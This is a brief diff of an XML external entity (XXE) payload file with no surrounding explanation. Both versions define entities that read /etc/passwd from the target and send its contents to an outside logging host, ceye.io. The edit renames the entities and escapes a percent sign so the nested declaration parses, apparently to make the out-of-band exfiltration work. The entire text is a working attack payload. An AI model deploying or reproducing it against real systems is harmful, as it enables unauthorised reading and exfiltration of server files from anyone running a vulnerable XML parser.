@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % int "<!ENTITY % send SYSTEM 'http://xxe.dvjfeh.ceye.io/%file;'>"> 
-%int; 
-%send; 
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://xxe.dvjfeh.ceye.io/%payload;'>">
+%int;
+%trick;
